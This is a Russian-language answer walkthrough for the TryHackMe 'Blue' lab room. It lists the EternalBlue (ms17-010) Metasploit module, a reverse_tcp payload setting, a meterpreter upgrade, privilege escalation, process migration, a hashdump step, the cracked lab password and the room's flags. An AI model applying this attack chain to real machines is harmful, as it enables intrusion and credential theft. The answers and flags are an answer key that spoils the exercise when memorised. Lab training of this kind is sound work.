[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Blue](https://tryhackme.com/r/room/blue) 

Всего 5 заданий:
## Задание 1
Просканируйте и узнайте, к какому эксплойту уязвима эта машина. Обратите внимание, что эта машина не отвечает на 
ping (ICMP) и может потребоваться несколько минут для загрузки. Эта комната не предназначена для boot2root CTF, 
скорее, это образовательная серия для полных новичков. Профессионалы, скорее всего, получат очень мало из этой 
комнаты, кроме базовой практики, поскольку процесс здесь предназначен для новичков.

Искусство одного из наших участников, Варга - Профиль THM - Instagram  - Blue Merch  - Twitter

Ссылка на Ice, продолжение Blue: Ссылка

Третью коробку из этой серии, Blaster, можно посмотреть здесь: Ссылка

-----------------------------------------

Виртуальную машину, используемую в этой комнате (синюю), можно загрузить для использования в автономном режиме с  
https://darkstar7471.com/resources.html 

Наслаждайтесь комнатой! Для будущих комнат и статей подписывайтесь на @darkstar7471 в Twitter.

### Ответить на вопросы ниже
Просканируйте машину. (Если вы не знаете, как с этим справиться, рекомендую заглянуть в комнату Nmap)
```commandline
Ответ не нужен
```
Сколько портов открыто с номером порта менее 1000?
```commandline
3
```
К чему уязвима эта машина? (Ответ в форме: ms??-???, например: ms08-067)
```commandline
ms17-010
```
## Задание 2
Используйте машину и закрепитесь.

### Ответить на вопросы ниже
Запустить Metasploit
```commandline
Ответ не нужен
```
Найдите код эксплуатации, который мы запустим против машины. Каков полный путь кода? (Например: эксплойт/........)
```commandline
exploit/windows/smb/ms17_010_eternalblue
```
Показать параметры и установить одно необходимое значение. Как называется это значение? (Все заглавные буквы для отправки)
```commandline
RHOSTS
```
Обычно было бы нормально запустить этот эксплойт как есть; однако, ради обучения, вы должны сделать еще одну вещь, 
прежде чем эксплуатировать цель. Введите следующую команду и нажмите Enter:

`set payload windows/x64/shell/reverse_tcp`

После этого запустите эксплойт!
```commandline
Ответ не нужен
```
Подтвердите, что эксплойт отработал правильно. Возможно, вам придется нажать Enter, чтобы появилась оболочка DOS. 
Переведите эту оболочку в фоновый режим (CTRL + Z). Если это не удалось, вам, возможно, придется перезагрузить 
целевую виртуальную машину. Попробуйте запустить ее снова перед перезагрузкой цели.   
```commandline
Ответ не нужен
```

## Задание 3
Повышайте привилегии, узнайте, как обновить оболочки в metasploit.

### Ответить на вопросы ниже
Если вы еще этого не сделали, переведите ранее полученную оболочку в фоновый режим (CTRL + Z). Найдите в интернете 
информацию о том, как преобразовать оболочку в оболочку meterpreter в metasploit. Как называется пост-модуль, 
который мы будем использовать? (Точный путь, аналогичный эксплойту, который мы выбрали ранее)   
```commandline
post/multi/manage/shell_to_meterpreter
```
Выберите это (используйте MODULE_PATH). Показать параметры, какой параметр нам необходимо изменить?
```commandline
SESSION
```
Установите требуемую опцию. Возможно, вам придется перечислить все сеансы, чтобы найти здесь нужную вам цель. 
```commandline
Ответ не нужен
```
Запустить! Если это не сработало, попробуйте выполнить эксплойт из предыдущей задачи еще раз.
```commandline
Ответ не нужен
```
После завершения преобразования оболочки meterpreter выберите этот сеанс для использования.
```commandline
Ответ не нужен
```
Убедитесь, что мы перешли на NT AUTHORITY\SYSTEM. Запустите getsystem, чтобы подтвердить это. Не стесняйтесь 
открывать оболочку dos с помощью команды 'shell' и запускать 'whoami'. Это должно вернуть, что мы действительно 
являемся системой. После этого переведите эту оболочку в фоновый режим и снова выберите наш сеанс meterpreter для 
использования.
```commandline
Ответ не нужен
```
Перечислите все процессы, запущенные с помощью команды 'ps'. То, что мы являемся системой, не означает, что наш 
процесс таковым является. Найдите процесс в нижней части этого списка, который запущен в NT AUTHORITY\SYSTEM, и 
запишите идентификатор процесса (крайний левый столбец).  
```commandline
Ответ не нужен
```
Перейдите в этот процесс с помощью команды 'migrate PROCESS_ID', где идентификатор процесса — тот, который вы только 
что записали на предыдущем шаге. Это может занять несколько попыток, миграция процессов не очень стабильна. Если это 
не удается, вам может потребоваться повторно запустить процесс преобразования или перезагрузить машину и начать 
снова. Если это произойдет, попробуйте другой процесс в следующий раз.
```commandline
Ответ не нужен
```

## Задание 4
Скопируйте пароль пользователя, не являющийся паролем по умолчанию, и взломайте его!

### Ответить на вопросы ниже
В нашей оболочке meterpreter с повышенными правами выполните команду 'hashdump'. Это позволит сбросить все пароли на 
машине, если у нас есть необходимые привилегии для этого. Каково имя пользователя, не являющегося пользователем по 
умолчанию?   
```commandline
Jon
```
Скопируйте этот хэш пароля в файл и найдите способ его взлома. Какой взломанный пароль?
```commandline
alqfna22
```

## Задание 5
Найдите три флага, установленных на этой машине. Это не традиционные флаги, они, скорее, представляют ключевые места 
в системе Windows. Используйте подсказки, приведенные ниже, чтобы пройти эту комнату!
-----------------------------------------------------------------
Закончили Blue? Проверьте Ice:  Ссылка

Третью коробку из этой серии, Blaster, можно посмотреть здесь: Ссылка

### Ответить на вопросы ниже
Флаг1? Этот флаг можно найти в корне системы. 

```commandline
flag{access_the_machine}
```
Флаг2? Этот флаг можно найти в месте хранения паролей в Windows.

*Errata: Windows действительно не нравится расположение этого флага, и иногда он может его удалить. В некоторых 
случаях может потребоваться завершить/перезапустить машину и повторно запустить эксплойт, чтобы найти этот флаг. Это 
довольно редко, однако это может произойти.   
```commandline
flag{sam_database_elevated_access}
```
flag3? Этот флаг можно найти в отличном месте для добычи. В конце концов, у Администраторов обычно есть довольно 
интересные сохраненные вещи.  
```commandline
flag{admin_documents_can_be_valuable}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)